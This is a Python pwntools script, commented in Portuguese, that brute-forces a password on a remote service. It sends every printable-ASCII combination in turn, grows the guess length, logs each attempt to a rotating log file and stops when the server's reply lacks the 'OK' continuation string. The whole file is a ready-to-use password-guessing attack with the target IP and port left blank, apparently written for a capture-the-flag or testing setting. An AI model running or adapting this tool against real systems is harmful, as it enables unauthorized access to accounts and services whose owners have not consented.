import logging
import logging.handlers
from pwn import *

#IP
ip = "";
#PORTA
port = 0;
#STRING DE CONTINUACAO
stringCon="OK"
#TRECHO STRING DE CONTINUACAO
stringConPart="OK"
# SE PRECISAR PARAR, COPIA O ULTIMO RESULTADO AQUI
s = 'AAAAAA'
#PRIMEIRO CARACTER DO RANGE ASCII A SER TESTADO
firstChar = 32
#ULTIMO CARACTER DO RANGE ASCII A SER TESTADO
lastChar = 126
#NOME DO ARQUIVO DE LOG
log_file_name = 'bruteforce.log'
logging_level = logging.INFO

handler = logging.handlers.TimedRotatingFileHandler(log_file_name, when="M", interval=30, backupCount=5)

logger = logging.getLogger()
logger.addHandler(handler)
logger.setLevel(logging_level)

class Password:
    def __init__(self, s, current):
        self.s = s
        self.current = current

#LE A RESPOSTA DO SERVIDOR
def readLines(c):
    r = ''
    reply = ''
    anterior = 'A'

    while r != stringCon and r!=anterior:
        anterior = r
        r = conn.recvline(timeout=1).decode("utf-8")
        if r != b'':
            reply += r
    return reply

#ROTACIONA O CARACTER CONFORME O RANGE DEFINIDO ACIMA
def popChar(c):
    current = ord(c)

    if current >= firstChar and current < lastChar:
        current+=1
    else:
        current = firstChar

    return chr(current)

#VERIFICA SE ESTA NA HORA DE AUMENTAR O TAMANHO DA SENHA
def isIncreaseString(s):
    reply = True
    for a in s:
        reply = reply and a == chr(lastChar)
    return reply

#AUMENTA O TAMANHO DA SENHA EM UM CARACTER
def increaseString(s):
    length = len(s)
    reply = ''
    for a in s:
        reply += chr(firstChar)
    reply+=chr(firstChar)
    return reply

#LOGICA PRINCIPAL DE ROTACIONAMENTO DE CARACTERES
def popString(o):
    char_array = [char for char in o.s]
    if isIncreaseString(o.s):
        return Password(increaseString(o.s), len(o.s))
    else:
        length = len(o.s)
        if ord(char_array[o.current]) != lastChar:
            char_array[o.current] = popChar(char_array[o.current])
            return Password(''.join(char_array), o.current)
        else:
            char_array[o.current] = chr(firstChar)
            p = popString(Password(''.join(char_array), o.current-1))
            return Password(p.s, o.current)

        


conn = remote(ip, port)

password = Password(s, len(s)-1)

while True:

    conn.clean()

    logger.info((">" + password.s + "<"))
    conn.send(password.s)
    reply = readLines(conn)
    
    if not stringConPart in reply:
        print(reply)
        logger.error(reply)
        break

    password = popString(password)
